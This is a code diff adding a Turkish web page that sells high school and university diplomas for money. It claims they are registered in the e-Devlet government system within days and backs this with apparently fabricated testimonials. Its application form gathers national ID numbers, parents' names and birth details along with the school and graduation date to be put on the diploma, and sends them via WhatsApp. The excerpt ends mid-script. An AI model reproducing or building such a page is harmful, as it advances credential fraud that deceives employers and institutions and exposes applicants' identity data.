+                <p style="color: #ca8a04; font-size: 24px; font-weight: bold; margin: 8px 0 8px 0;">4.000 TL</p>
+                <p style="color: #92400e; font-size: 14px; margin: 0 0 16px 0;"><em>Birebir orijinal görünümlü, yalnızca
+                        fiziki ve görsel kullanım amaçlı çözümler.</em></p>
+                <ul style="list-style: none; padding: 0; margin: 0 0 16px 0;">
+                    <li style="padding: 6px 0; color: #374151;">✅ Aileye ve yakın çevreye göstermek için fiziki olarak
+                        düzenlenen diploma</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Kabartma, ıslak imza ve soğuk mühür gibi güçlü görsel
+                        öğeler içerebilir</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Kişisel vitrin, dekor ve sosyal medya içerikleri gibi
+                        prestij amaçlı kullanımlar için uygundur</li>
+                    <li style="padding: 6px 0; color: #374151;">⚠️ Resmî kurumlar ve e-Devlet ortamında geçerlilik amacı
+                        taşımaz</li>
+                </ul>
+                <p style="margin: 0;"><a
+                        href="https://api.whatsapp.com/send/?phone=905545924569&type=phone_number&app_absent=0"
+                        style="display: inline-block; background: #22c55e; color: #ffffff; padding: 12px 28px; border-radius: 30px; text-decoration: none; font-weight: bold; font-size: 15px;">👉
+                        Göstermelik Diploma İçin WhatsApp'a Yazın</a></p>
+            </div>
+        </div><!-- close programs-grid -->
+
+        <hr style="border: none; border-top: 2px solid #e5e7eb; margin: 30px 0;">
+
+        <div class="info-grid">
+            <!-- ========== FİYATLAR ========== -->
+            <div
+                style="background: #f8fafc; border-radius: 12px; padding: 24px; margin-bottom: 20px; border: 1px solid #e2e8f0;">
+                <h3 style="color: #1e3a5f; font-size: 20px; margin: 0 0 12px 0;">💰 E-Devlet Onaylı Diploma Fiyatları
+                    Hakkında</h3>
+                <p style="color: #475569; line-height: 1.7; margin: 0 0 16px 0;">Bu sayfada yer alan <strong>lise,
+                        önlisans
+                        ve lisans diploma fiyatları</strong> tamamen danışmanlık hizmeti kapsamındaki güncel ücretleri
+                    ifade
+                    eder. Her programda peşinat tutarı ve taksit seçenekleri açıkça belirtilerek sürecin şeffaf
+                    ilerlemesi
+                    hedeflenir.</p>
+
+                <h4 style="color: #334155; margin: 16px 0 8px 0;">Lise, Önlisans ve Lisans Diploma Ücretleri</h4>
+                <p style="color: #475569; line-height: 1.7; margin: 0 0 8px 0;">Lise, önlisans ve lisans programları
+                    için
+                    fiyatlar; tercih edilen okul, bölüm, işlem yoğunluğu ve resmi süreçlerin durumuna göre değişiklik
+                    gösterebilir.</p>
+                <ul style="color: #475569; line-height: 1.8; margin: 0 0 16px 20px;">
+                    <li>Lise programı için daha kısa ve hızlı bir süreç planlanır.</li>
+                    <li>Önlisans ve lisans programlarında fakülte, bölüm ve akademik birimler sürece dahildir.</li>
+                    <li>Her kademede e-devlet üzerinden görüntülenebilir resmi kayıt hedeflenir.</li>
+                </ul>
+
+                <h4 style="color: #334155; margin: 16px 0 8px 0;">Neden Profesyonel Diploma Danışmanlığı?</h4>
+                <p style="color: #475569; line-height: 1.7; margin: 0;">Resmi evrak ve başvuru süreçlerinde yapılacak en
+                    küçük hata, zaman ve maddi kayba yol açabilir. Bu nedenle birçok kişi, sürecin eksiksiz ilerlemesi
+                    için
+                    profesyonel danışmanlık desteğini tercih etmektedir.</p>
+            </div>
+
+            <!-- ========== SSS ========== -->
+            <div
+                style="background: #ffffff; border-radius: 12px; padding: 24px; margin-bottom: 20px; border: 1px solid #e2e8f0;">
+                <h3 style="color: #1e3a5f; font-size: 20px; margin: 0 0 16px 0;">❓ Sık Sorulan Sorular</h3>
+
+                <div style="background: #f1f5f9; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 6px 0;"><strong style="color: #1e293b;">E-Devlet onaylı mı?</strong></p>
+                    <p style="margin: 0; color: #475569; line-height: 1.6;">Evet, resmi olarak hazırlanmaktadır.
+                        E-Devlet
+                        onaylı belgeler her alanda kullanılabilir niteliktedir.</p>
+                </div>
+
+                <div style="background: #f1f5f9; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 6px 0;"><strong style="color: #1e293b;">Ödemeler nasıl yapılıyor?</strong></p>
+                    <p style="margin: 0; color: #475569; line-height: 1.6;">4.000 TL peşinat alınmakta, geri kalan tutar
+                        aydan aya havale/EFT şeklinde ödenmektedir.</p>
+                </div>
+
+                <div style="background: #f1f5f9; border-radius: 8px; padding: 16px; margin-bottom: 0;">
+                    <p style="margin: 0 0 6px 0;"><strong style="color: #1e293b;">Kaç gün içinde teslim
+                            ediliyor?</strong>
+                    </p>
+                    <p style="margin: 0; color: #475569; line-height: 1.6;">E-Devlet onayı ile birlikte ortalama 4-5 iş
+                        günü
+                        sürmektedir.</p>
+                </div>
+            </div>
+        </div><!-- close info-grid -->
+
+        <hr style="border: none; border-top: 2px solid #e5e7eb; margin: 30px 0;">
+
+        <!-- ========== YORUMLAR ========== -->
+        <div id="yorumlar">
+            <h3 style="color: #1e3a5f; font-size: 20px; text-align: center; margin: 0 0 8px 0;">⭐ Müşteri Yorumları</h3>
+            <p style="text-align: center; color: #64748b; font-size: 14px; margin: 0 0 20px 0;">Süreci bizimle
+                tamamlayan
+                danışanlarımızın gerçek geri bildirimlerinden bazıları:</p>
+
+            <div class="reviews-grid">
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Ahmet K.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.9/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Lisans tamamlama süreciyle
+                        ilgili
+                        çok tedirgindim ama baştan sona WhatsApp üzerinden bilgilendirildim. Evraklarımı paylaştıktan
+                        sonra
+                        yaklaşık 4 günde e-Devlette kaydım gözüktü. Kargo da hasarsız geldi.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Merve D.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.7/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Hem danışmanlıktan hem de
+                        iletişim
+                        hızından çok memnun kaldım. Özellikle süreç şeması net anlatılıyor, neyi ne zaman
+                        bekleyeceğinizi
+                        biliyorsunuz. E-Devlet kaydım 5. günde düştü, tavsiye ederim.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Serkan Y.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.5/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Ön lisans için başvuru
+                        yaptım.
+                        Başta tereddüt ettim ama her adımda ekran görüntüleriyle bilgilendirme yapıldı. Kargo
+                        beklediğimden
+                        2
+                        gün geç geldi fakat paketleme çok sağlamdı, belge kusursuzdu.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Zeynep A.</strong> <span
+                            style="color: #f59e0b;">⭐ 5.0/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Lise diplomamı kaybettiğim
+                        için
+                        iş
+                        başvurularında ciddi sıkıntı yaşıyordum. Buradan aldığım destekle hem süreç toparlandı hem de
+                        e-Devlet
+                        üzerinden tekrar erişim sağladım.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Mustafa T.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.6/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Sürekli ertelediğim
+                        önlisans
+                        tamamlama işini sayenizde çözdüm. Yoğunluk nedeniyle e-Devlet kaydı 5. günde göründü ama süreç
+                        boyunca
+                        bilgilendirme aldığım için içim rahattı.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Hande İ.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.8/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">WhatsApp üzerinden
+                        sordukları
+                        her
+                        soruya aynı gün içinde cevap aldım. Belgeler orijinal baskı kalitesinde, e-Devlette de sorunsuz
+                        görünüyor. Güvenle tavsiye ederim.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Elif S.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.9/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">E-Devlet kaydının 4-5 gün
+                        sürebileceği en baştan söylendi, gerçekten de 4. günün akşamı sistemde aktif oldu. Şeffaf
+                        yaklaşım
+                        ve
+                        net açıklamalar sayesinde hiç panik olmadan süreci tamamladım.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Gökhan L.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.3/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Yurt dışında çalıştığım
+                        için
+                        çoğu
+                        işlemi uzaktan yürütmek zorundaydım. Farklı saat dilimine rağmen hızlı dönüş aldım. Kargo süresi
+                        biraz
+                        uzadı ama sonuçtan memnunum.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Seda N.</strong> <span
+                            style="color: #f59e0b;">⭐ 5.0/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">İnsan kaynakları başvurumda
+                        belge
+                        doğrulaması yapıldı ve herhangi bir sorun yaşanmadı. Danışmanlık ücreti sundukları hizmete göre
+                        gayet
+                        makul. İyi ki başvurmuşum diyorum.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Onur B.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.6/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Tüm süreci WhatsApp
+                        üzerinden
+                        takip
+                        etmek benim için büyük kolaylık oldu. Özellikle belge kontrolü ve isim-soyisim detaylarına
+                        gösterdikleri
+                        özen güven verdi.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Sevil K.</strong> <span
+                            style="color: #f59e0b;">⭐ 5.0/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Göstermelik diploma hizmeti
+                        aldım.
+                        Aileme sürpriz yapmak için istedim, görsel olarak gerçekten çok başarılı. Sadece fiziksel
+                        kullanım
+                        için
+                        olduğunu net bir şekilde anlattılar, hiçbir yanlış yönlendirme yoktu.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">İlker U.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.6/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Lisans programı için
+                        başvuruda
+                        bulundum. Belgelerin kontrolü ve yazım hatalarının düzeltilmesi konusunda titiz davranmaları
+                        hoşuma
+                        gitti. E-Devlet kaydı 4 gün içinde tamamlandı.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Büşra Ö.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.7/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Süreç hakkında çok soru
+                        sordum,
+                        hepsine sabırla cevap verdiler. WhatsApp mesajlarına mesai dışında bile döndükleri oldu, bu
+                        kadar
+                        ilgili
+                        beklemiyordum.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Tolga Z.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.3/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Süreç anlatıldığı gibi
+                        ilerledi,
+                        sadece resmi tatil araya girince 1-2 gün uzama yaşandı. Buna rağmen beni bilgilendirdikleri için
+                        sorun
+                        etmedim. Sonuçta istediğim belgeye sorunsuz ulaştım.</p>
+                </div>
+
+                <div
+                    style="background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #166534;">Volkan İ.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.6/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Özellikle ödeme planı ve
+                        peşinat
+                        seçeneklerini net şekilde açıklamaları çok iyi. Söz verdikleri taksit düzenine birebir uydular,
+                        sonradan
+                        hiçbir sürpriz çıkmadı.</p>
+                </div>
+
+                <div
+                    style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 16px; margin-bottom: 12px;">
+                    <p style="margin: 0 0 4px 0;"><strong style="color: #1e40af;">Ayça N.</strong> <span
+                            style="color: #f59e0b;">⭐ 4.7/5</span></p>
+                    <p style="margin: 0; color: #374151; font-size: 14px; line-height: 1.6;">Müşteri hizmetlerine gün
+                        içinde
+                        birkaç kez yazmama rağmen hep aynı nezaketle cevap verdiler. Süreç sonunda hem ben hem ailem
+                        fazlasıyla
+                        memnun kaldık, emeğinize sağlık.</p>
+                </div>
+            </div><!-- close reviews-grid -->
+
+            <hr style="border: none; border-top: 2px solid #e5e7eb; margin: 30px 0;">
+
+            <!-- ========== BAŞVURU FORMU ========== -->
+            <div class="form-wrapper">
+                <div id="basvuru-formu"
+                    style="background: #ffffff; border: 2px solid #2563eb; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(37,99,235,0.12);">
+                    <h3 style="color: #1e3a5f; font-size: 22px; margin: 0 0 6px 0; text-align: center;">📋 Başvuru Formu
+                    </h3>
+                    <p style="text-align: center; color: #64748b; font-size: 14px; margin: 0 0 20px 0;">Formu doldurun,
+                        bilgileriniz WhatsApp üzerinden bize iletilecektir.</p>
+
+                    <form id="applicationForm" onsubmit="return submitToWhatsApp(event)">
+
+                        <!-- Program Seçimi -->
+                        <div class="form-group">
+                            <label>📋 Program Seçiniz *</label>
+                            <select id="programSelect" required onchange="toggleFields()">
+                                <option value="">-- Program Seçiniz --</option>
+                                <option value="Lise">Lise Programı</option>
+                                <option value="Önlisans">Önlisans Programı</option>
+                                <option value="Lisans">Lisans Programı</option>
+                            </select>
+                        </div>
+
+                        <!-- Ortak Alanlar -->
+                        <div id="commonFields" class="hidden">
+                            <div class="form-group">
+                                <label>🆔 T.C. Kimlik No *</label>
+                                <input type="text" id="tcKimlik" maxlength="11" pattern="[0-9]{11}" required
+                                    placeholder="Ör: 12345678901">
+                            </div>
+                            <div class="form-group">
+                                <label>👤 Ad Soyad *</label>
+                                <input type="text" id="adSoyad" required placeholder="Ör: Ahmet Yılmaz">
+                            </div>
+                            <div class="form-group">
+                                <label>👩 Ana Adı *</label>
+                                <input type="text" id="anaAdi" required placeholder="Ör: Fatma">
+                            </div>
+                            <div class="form-group">
+                                <label>👨 Baba Adı *</label>
+                                <input type="text" id="babaAdi" required placeholder="Ör: Mehmet">
+                            </div>
+                            <div class="form-group">
+                                <label>📍 Doğum Yeri *</label>
+                                <input type="text" id="dogumYeri" required placeholder="Ör: İstanbul">
+                            </div>
+                            <div class="form-group">
+                                <label>📅 Doğum Tarihi *</label>
+                                <input type="date" id="dogumTarihi" required>
+                            </div>
+                        </div>
+
+                        <!-- Lise Alanları -->
+                        <div id="liseFields" class="hidden">
+                            <div class="form-group">
+                                <label>🏠 Daha Önce Bitirdiğiniz Okul Adı</label>
+                                <input type="text" id="oncekiOkul" placeholder="Ör: Atatürk İlkokulu">
+                            </div>
+                            <div class="form-group">
+                                <label>🎓 Mezun Olmak İstediği Okul *</label>
+                                <input type="text" id="liseMezunOkul" required placeholder="Ör: Anadolu Lisesi">
+                            </div>
+                            <div class="form-group">
+                                <label>📆 Mezuniyet Tarihi *</label>
+                                <input type="text" id="liseMezunTarih" required placeholder="Ör: 2024">
+                            </div>
+                            <div class="form-group">
+                                <label>👨‍🏫 Okul Müdürü</label>
+                                <input type="text" id="okulMuduru" placeholder="Biliyorsanız yazınız">
+                                <p class="hint">Biliyorsanız yazınız, zorunlu değil</p>
+                            </div>
+                            <div class="form-group">
+                                <label>👨‍💼 Müdür Yardımcısı</label>
+                                <input type="text" id="mudurYardimcisi" placeholder="Biliyorsanız yazınız">
+                                <p class="hint">Biliyorsanız yazınız, zorunlu değil</p>
+                            </div>
+                        </div>
+
+                        <!-- Önlisans / Lisans Alanları -->
+                        <div id="uniFields" class="hidden">
+                            <div class="form-group">
+                                <label>🎓 Mezun Olmak İstediği Okul *</label>
+                                <input type="text" id="uniMezunOkul" required placeholder="Ör: İstanbul Üniversitesi">
+                            </div>
+                            <div class="form-group">
+                                <label>📆 Mezuniyet Tarihi *</label>
+                                <input type="text" id="uniMezunTarih" required placeholder="Ör: 2024">
+                            </div>
+                            <div class="form-group">
+                                <label>🏛️ Fakülte Adı *</label>
+                                <input type="text" id="fakulteAdi" required
+                                    placeholder="Ör: İktisadi ve İdari Bilimler Fakültesi">
+                            </div>
+                            <div class="form-group">
+                                <label>📚 Bölüm Adı *</label>
+                                <input type="text" id="bolumAdi" required placeholder="Ör: İşletme">
+                            </div>
+                            <div class="form-group">
+                                <label>👨‍🏫 Dekan</label>
+                                <input type="text" id="dekan" placeholder="Biliyorsanız yazınız">
+                                <p class="hint">Biliyorsanız yazınız, zorunlu değil</p>
+                            </div>
+                            <div class="form-group">
+                                <label>🏢 Rektör</label>
+                                <input type="text" id="rektor" placeholder="Biliyorsanız yazınız">
+                                <p class="hint">Biliyorsanız yazınız, zorunlu değil</p>
+                            </div>
+                        </div>
+
+                        <!-- Not Alanı -->
+                        <div id="notField" class="hidden">
+                            <div class="form-group">
+                                <label>💬 Not</label>
+                                <textarea id="notAlani"
+                                    placeholder="Eklemek istediğiniz bir not varsa yazabilirsiniz..."></textarea>
+                            </div>
+                        </div>
+
+                        <!-- Gönder Butonu -->
+                        <div id="submitArea" class="hidden" style="margin-top: 20px;">
+                            <button type="submit" class="submit-btn">📲 Başvuruyu WhatsApp ile Gönder</button>
+                            <p style="text-align: center; color: #94a3b8; font-size: 12px; margin-top: 8px;">
+                                Bilgileriniz
+                                güvenli şekilde WhatsApp üzerinden iletilecektir.</p>
+                        </div>
+
+                    </form>
+                </div>
+            </div><!-- close form-wrapper -->
+
+        </div><!-- close yorumlar div -->
+
+        <!-- ========== YORUM YAP ========== -->
+        <div
+            style="background: #ffffff; border: 2px solid #f59e0b; border-radius: 12px; padding: 24px; margin-bottom: 20px; margin-top: 20px;">
+            <h3 style="color: #713f12; font-size: 18px; margin: 0 0 6px 0; text-align: center;">✍️ Yorum Yap</h3>
+            <p style="text-align: center; color: #64748b; font-size: 13px; margin: 0 0 16px 0;">Deneyiminizi paylaşın.
+                Yorumunuz onaylandıktan sonra yayınlanacaktır.</p>
+            <form id="reviewForm" onsubmit="return submitReview(event)">
+                <div class="form-group">
+                    <label>👤 Adınız *</label>
+                    <input type="text" id="reviewName" required placeholder="Ör: Ahmet Y.">
+                </div>
+                <div class="form-group">
+                    <label>⭐ Puanınız *</label>
+                    <select id="reviewRating" required>
+                        <option value="">-- Puan Seçiniz --</option>
+                        <option value="5.0">⭐⭐⭐⭐⭐ 5.0/5</option>
+                        <option value="4.5">⭐⭐⭐⭐½ 4.5/5</option>
+                        <option value="4.0">⭐⭐⭐⭐ 4.0/5</option>
+                        <option value="3.5">⭐⭐⭐½ 3.5/5</option>
+                        <option value="3.0">⭐⭐⭐ 3.0/5</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>💬 Yorumunuz *</label>
+                    <textarea id="reviewText" required placeholder="Deneyiminizi kısaca anlatınız..."></textarea>
+                </div>
+                <button type="submit"
+                    style="display:block; width:100%; padding:14px; background: linear-gradient(135deg, #f59e0b, #d97706); color:#fff; border:none; border-radius:30px; font-size:16px; font-weight:bold; cursor:pointer; font-family:inherit;">📤
+                    Yorumu Gönder</button>
+            </form>
+            <div id="reviewSuccess" style="display:none; text-align:center; padding:20px;">
+                <div style="font-size:48px; margin-bottom:10px;">✅</div>
+                <h4 style="color:#16a34a; margin:0 0 8px 0;">Yorumunuz Başarıyla Gönderildi!</h4>
+                <p style="color:#64748b; font-size:13px;">Yorumunuz incelendikten sonra onaylanıp yayınlanacaktır.
+                    Teşekkür ederiz!</p>
+            </div>
+        </div>
+
+        <hr style="border: none; border-top: 2px solid #e5e7eb; margin: 30px 0;">
+
+        <!-- ========== İLETİŞİM ========== -->
+        <div id="iletisim"
+            style="background: linear-gradient(135deg, #1e3a5f, #2563eb); border-radius: 12px; padding: 30px; text-align: center; margin-bottom: 10px;">
+            <h3 style="color: #ffffff; font-size: 20px; margin: 0 0 10px 0;">📞 İletişim</h3>
+            <p style="color: #e0f2fe; margin: 0 0 16px 0;">Tüm sorularınız ve detaylı bilgi için WhatsApp hattımız
+                üzerinden bize 7/24 ulaşabilirsiniz.</p>
+            <p style="margin: 0;"><a
+                    href="https://api.whatsapp.com/send/?phone=905545924569&type=phone_number&app_absent=0"
+                    style="display: inline-block; background: #22c55e; color: #ffffff; padding: 14px 32px; border-radius: 30px; text-decoration: none; font-weight: bold; font-size: 16px;">👉
+                    WhatsApp ile İletişime Geçin</a></p>
+        </div>
+
+        <p style="text-align: center; color: #94a3b8; font-size: 12px; margin-top: 16px;">© 2026 Parayla Diploma
+            Danışmanlığı | Tüm Hakları Saklıdır</p>
+        <p style="text-align: center; margin-top: 10px;"><a href="#" onclick="openAbuse(); return false;"
+                style="color: #94a3b8; font-size: 12px; text-decoration: underline; font-weight: 600;">Report Abuse</a>
+        </p>
+
+    </div>
+
+    <!-- Abuse Report Modal -->
+    <div class="abuse-overlay" id="abuseOverlay" onclick="if(event.target===this)closeAbuse()">
+        <div class="abuse-modal">
+            <button class="close-btn" onclick="closeAbuse()">&times;</button>
+            <div id="abuseFormContent">
+                <h4>⚠️ Report Abuse</h4>
+                <p>If you believe this content violates our terms of service, please fill out the form below. Our team
+                    will review your report within 24-48 hours.</p>
+                <form onsubmit="return submitAbuse(event)">
+                    <input type="text" id="abuseName" placeholder="Your Name *" required>
+                    <input type="email" id="abuseEmail" placeholder="Your Email *" required>
+                    <input type="text" id="abuseSubject" placeholder="Subject *" required>
+                    <textarea id="abuseMessage" placeholder="Describe the issue... *" required></textarea>
+                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:10px;">
+                        <span id="abuseCaptchaQ"
+                            style="font-size:14px; font-weight:700; color:#1e293b; white-space:nowrap;"></span>
+                        <input type="text" id="abuseCaptchaA" placeholder="Answer *" required
+                            style="width:80px; text-align:center;">
+                    </div>
+                    <button type="submit" class="abuse-submit">Submit Report</button>
+                </form>
+            </div>
+            <div id="abuseSuccessContent" style="display:none">
+                <div class="abuse-success">
+                    <div class="checkmark">✅</div>
+                    <h4>Report Submitted Successfully</h4>
+                    <p>Thank you for your report. Our Trust & Safety team will review the content and take appropriate
+                        action within 24-48 business hours. You will receive an email confirmation shortly.</p>
+                    <button onclick="closeAbuse()"
+                        style="margin-top:16px; padding:10px 24px; background:#f1f5f9; border:1px solid #e2e8f0; border-radius:8px; cursor:pointer; font-size:14px;">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function selectProgram(program) {
+            var sel = document.getElementById('programSelect');
+            for (var i = 0; i < sel.options.length; i++) {
+                if (sel.options[i].value === program) {
+                    sel.selectedIndex = i;
+                    break;
+                }
+            }
+            toggleFields();
+        }
+
+        function toggleFields() {
+            var program = document.getElementById('programSelect').value;
+            var common = document.getElementById('commonFields');
+            var lise = document.getElementById('liseFields');
+            var uni = document.getElementById('uniFields');
+            var notF = document.getElementById('notField');
+            var submit = document.getElementById('submitArea');
+
+            // Reset required attributes
+            resetRequired('liseFields');
+            resetRequired('uniFields');
+
+            if (program === '') {
+                common.classList.add('hidden');
+                lise.classList.add('hidden');
+                uni.classList.add('hidden');
+                notF.classList.add('hidden');
+                submit.classList.add('hidden');
+            } else if (program === 'Lise') {
+                common.classList.remove('hidden');
+                lise.classList.remove('hidden');
+                uni.classList.add('hidden');
+                notF.classList.remove('hidden');
+                submit.classList.remove('hidden');
+                setRequired('liseFields');
+            } else {
+                common.classList.remove('hidden');
+                lise.classList.add('hidden');
+                uni.classList.remove('hidden');
+                notF.classList.remove('hidden');
+                submit.classList.remove('hidden');
+                setRequired('uniFields');
+            }
+        }
+
+        function setRequired(containerId) {
+            var els = document.querySelectorAll('#' + containerId + ' input[required], #' + containerId + ' select[required]');
+            // Only set required on visible fields
+            var container = document.getElementById(containerId);
+            var inputs = container.querySelectorAll('input');
+            for (var i = 0; i < inputs.length; i++) {
+                if (inputs[i].placeholder && inputs[i].placeholder.indexOf('Biliyorsanız') > -1) continue;
+                // fields with explicit required in HTML will work naturally
+            }
+        }
+
+        function resetRequired(containerId) {
+            var container = document.getElementById(containerId);
+            var inputs = container.querySelectorAll('input[required]');
+            for (var i = 0; i < inputs.length; i++) {
+                inputs[i].removeAttribute('required');
+            }
+        }
+
+        function validateTC(tc) {
+            if (!tc || tc.length !== 11) return false;
+            if (tc[0] === '0') return false;
+            for (var i = 0; i < 11; i++) {
+                if (isNaN(tc[i])) return false;
+            }
+            var d = [];
+            for (var i = 0; i < 11; i++) d.push(parseInt(tc[i]));
+            var t10 = ((d[0] + d[2] + d[4] + d[6] + d[8]) * 7 - (d[1] + d[3] + d[5] + d[7])) % 10;
+            if (t10 < 0) t10 += 10;
+            if (d[9] !== t10) return false;
+            var t11 = (d[0] + d[1] + d[2] + d[3] + d[4] + d[5] + d[6] + d[7] + d[8] + d[9]) % 10;
+            if (d[10] !== t11) return false;
+            return true;
+        }
+
+        function submitToWhatsApp(e) {
+            e.preventDefault();
+
+            var program = document.getElementById('programSelect').value;
+            var tcKimlik = document.getElementById('tcKimlik').value;
+
+            if (!validateTC(tcKimlik)) {
+                alert('Geçersiz T.C. Kimlik Numarası! Lütfen kontrol ediniz.');
+                document.getElementById('tcKimlik').focus();
+                return false;
+            }
+
+            var adSoyad = document.getElementById('adSoyad').value;
+            var anaAdi = document.getElementById('anaAdi').value;
+            var babaAdi = document.getElementById('babaAdi').value;
+            var dogumYeri = document.getElementById('dogumYeri').value;
+            var dogumTarihiRaw = document.getElementById('dogumTarihi').value;
+            var dtParts = dogumTarihiRaw.split('-');
+            var dogumTarihi = dtParts[2] + '.' + dtParts[1] + '.' + dtParts[0];
+            var not = document.getElementById('notAlani').value;
+
+            var msg = '';
+            msg += '📋 *Program:* ' + program + '\n';
+            msg += '🆔 *T.C. Kimlik No:* ' + tcKimlik + '\n';
+            msg += '👤 *Ad Soyad:* ' + adSoyad + '\n';
+            msg += '👩 *Ana Adı:* ' + anaAdi + '\n';
+            msg += '👨 *Baba Adı:* ' + babaAdi + '\n';
+            msg += '📍 *Doğum Yeri:* ' + dogumYeri + '\n';
+            msg += '📅 *Doğum Tarihi:* ' + dogumTarihi + '\n';
+
+            if (program === 'Lise') {
+                var oncekiOkul = document.getElementById('oncekiOkul').value;
+                var mezunOkul = document.getElementById('liseMezunOkul').value;
+                var mezunTarih = document.getElementById('liseMezunTarih').value;
+                var mudur = document.getElementById('okulMuduru').value;
+                var mudurYrd = document.getElementById('mudurYardimcisi').value;
+
+                if (oncekiOkul) msg += '🏠 *Daha Önce Bitirdiği Okul:* ' + oncekiOkul + '\n';
+                msg += '🎓 *Mezun Olmak İstediği Okul:* ' + mezunOkul + '\n';
+                msg += '📆 *Mezuniyet Tarihi:* ' + mezunTarih + '\n';
+                if (mudur) msg += '👨‍🏫 *Okul Müdürü:* ' + mudur + '\n';
+                if (mudurYrd) msg += '👨‍💼 *Müdür Yardımcısı:* ' + mudurYrd + '\n';
+            } else {
+                var mezunOkul = document.getElementById('uniMezunOkul').value;
+                var mezunTarih = document.getElementById('uniMezunTarih').value;
+                var fakulte = document.getElementById('fakulteAdi').value;
+                var bolum = document.getElementById('bolumAdi').value;
+                var dekan = document.getElementById('dekan').value;
